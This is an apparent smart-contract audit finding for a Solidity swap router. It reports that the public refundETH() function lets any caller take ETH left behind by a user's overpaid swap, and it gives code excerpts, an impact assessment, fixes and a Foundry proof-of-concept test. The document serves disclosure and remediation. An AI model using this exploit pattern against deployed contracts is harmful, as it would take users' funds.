### Title
Unguarded `refundETH()` Allows Any Caller to Steal Residual ETH Left by a Prior Swap - (`metric-periphery/contracts/base/PeripheryPayments.sol`)

---

### Summary

`PeripheryPayments.refundETH()` transfers the router's entire native ETH balance to `msg.sender` with no access control. Because `exactInputSingle` (and other payable swap functions) are `payable` and the internal `pay()` function only wraps exactly `amountIn` worth of native ETH — leaving any excess in the contract — a victim who sends more ETH than their swap consumes will have that residual stolen by any attacker who calls `refundETH()` in a subsequent transaction.

---

### Finding Description

`refundETH()` is unconditionally public with no caller check: [1](#0-0) 

```solidity
function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
        _transferETH(msg.sender, balance);   // ← sends to whoever calls, not the depositor
    }
}
```

The `pay()` function, when `token == WETH` and the router holds native ETH, wraps **exactly** `value` (= `amountIn`) and leaves any surplus untouched: [2](#0-1) 

```solidity
} else if (token == WETH) {
    uint256 nativeBalance = address(this).balance;
    if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();   // wraps exactly `value`
        IERC20(WETH).safeTransfer(recipient, value);
        // nativeBalance - value stays in the router
    }
```

`exactInputSingle` is `payable` and stores `msg.sender` as payer but never enforces `msg.value == amountIn`: [3](#0-2) 

The `receive()` guard only blocks plain ETH transfers; it does **not** block ETH attached to a function call, so a user can legitimately (or accidentally) send `msg.value > amountIn` with a direct `exactInputSingle` call.

The intended safe pattern — `multicall{value}([exactInputSingle, refundETH])` — is documented in tests: [4](#0-3) 

but is **not enforced** by the contract. A standalone `exactInputSingle{value: X}` call where `X > amountIn` leaves `X - amountIn` ETH in the router, claimable by anyone.

---

### Impact Explanation

Direct loss of user ETH principal. Any ETH left in the router after a swap (due to over-payment) is immediately claimable by an arbitrary caller via `refundETH()`. The victim receives no refund; the attacker receives the full residual balance. This satisfies the "direct loss of user principal" impact gate.

---

### Likelihood Explanation

- `exactInputSingle`, `exactInput`, `exactOutputSingle`, and `exactOutput` are all `payable`.
- The mixed-native pattern (sending partial ETH + pulling the rest from WETH allowance) is explicitly supported and tested, meaning users are expected to send ETH with these calls.
- A user who sends a round ETH amount (e.g. `1 ETH`) for a swap whose `amountIn` is `1 ETH` but whose actual pool consumption is slightly less, or who simply over-estimates, will strand the difference.
- MEV bots monitoring the mempool can front-run the victim's own `refundETH()` call or simply call it in the next block.

---

### Recommendation

Two complementary fixes:

1. **Auto-refund in swap functions**: After each swap entry-point (`exactInputSingle`, etc.), if `tokenIn == WETH` and `address(this).balance > 0`, transfer the residual back to `msg.sender` before returning.

2. **Access-control `refundETH()`**: Accept a `recipient` parameter (as Uniswap v3 `SwapRouter02` does) so the caller explicitly designates who receives the refund, or restrict it to `msg.sender` only within a `multicall` context (e.g., via a transient "initiator" slot set at `multicall` entry).

---

### Proof of Concept

```solidity
// Foundry integration test sketch
function test_attacker_steals_residual_eth() public {
    address victim  = makeAddr("victim");
    address attacker = makeAddr("attacker");
    vm.deal(victim, 1.001 ether);

    // Victim swaps 1 ETH worth of WETH but sends 1.001 ETH
    vm.prank(victim);
    router.exactInputSingle{value: 1.001 ether}(
        IMetricOmmSimpleRouter.ExactInputSingleParams({
            pool: address(pool),
            tokenIn: address(weth),
            tokenOut: address(token1),
            zeroForOne: true,
            amountIn: 1 ether,          // pay() wraps exactly 1 ETH
            amountOutMinimum: 0,
            recipient: victim,
            deadline: block.timestamp + 60,
            priceLimitX64: 0,
            extensionData: ""
        })
    );
    // 0.001 ETH is now stranded in the router

    uint256 before = attacker.balance;
    vm.prank(attacker);
    router.refundETH();                 // no access control → attacker gets 0.001 ETH

    assertEq(attacker.balance - before, 0.001 ether, "attacker stole residual ETH");
    assertEq(address(router).balance, 0);
}
```

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L58-63)
```text
  function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
      _transferETH(msg.sender, balance);
    }
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L73-78)
```text
    } else if (token == WETH) {
      uint256 nativeBalance = address(this).balance;
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
      } else if (nativeBalance > 0) {
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L67-86)
```text
  function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut) {
    _checkDeadline(params.deadline);
    uint128 priceLimitX64 = MetricOmmSwapPath.normalizePriceLimit(params.zeroForOne, params.priceLimitX64);

    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(
        params.recipient,
        params.zeroForOne,
        MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountIn),
        priceLimitX64,
        "",
        params.extensionData
      );
    int128 out = MetricOmmSwapResults.extractAmountOut(params.zeroForOne, amount0Delta, amount1Delta);
    amountOut = MetricOmmSwapInputs.int128ToUint128(out);
    if (amountOut < params.amountOutMinimum) revert InsufficientOutput(amountOut, params.amountOutMinimum);

    _clearExpectedCallbackPool();
  }
```

**File:** metric-periphery/test/MetricOmmSimpleRouter.native.t.sol (L106-133)
```text
  function test_multicall_ethInput_exactInputSingle_refundsUnusedEth() public {
    uint128 amountIn = 1_000;
    uint256 msgValue = 2 ether;
    uint256 swapperEthBefore = swapper.balance;

    vm.prank(swapper);
    bytes[] memory calls = new bytes[](2);
    calls[0] = abi.encodeWithSelector(
      router.exactInputSingle.selector,
      IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool: address(pool),
        tokenIn: address(weth),
        tokenOut: address(token1),
        zeroForOne: true,
        amountIn: amountIn,
        amountOutMinimum: 0,
        recipient: recipient,
        deadline: _deadline(),
        priceLimitX64: 0,
        extensionData: ""
      })
    );
    calls[1] = abi.encodeWithSelector(router.refundETH.selector);
    router.multicall{value: msgValue}(calls);

    assertEq(swapper.balance, swapperEthBefore - amountIn, "unused eth refunded");
    _assertRouterEmpty();
  }
```
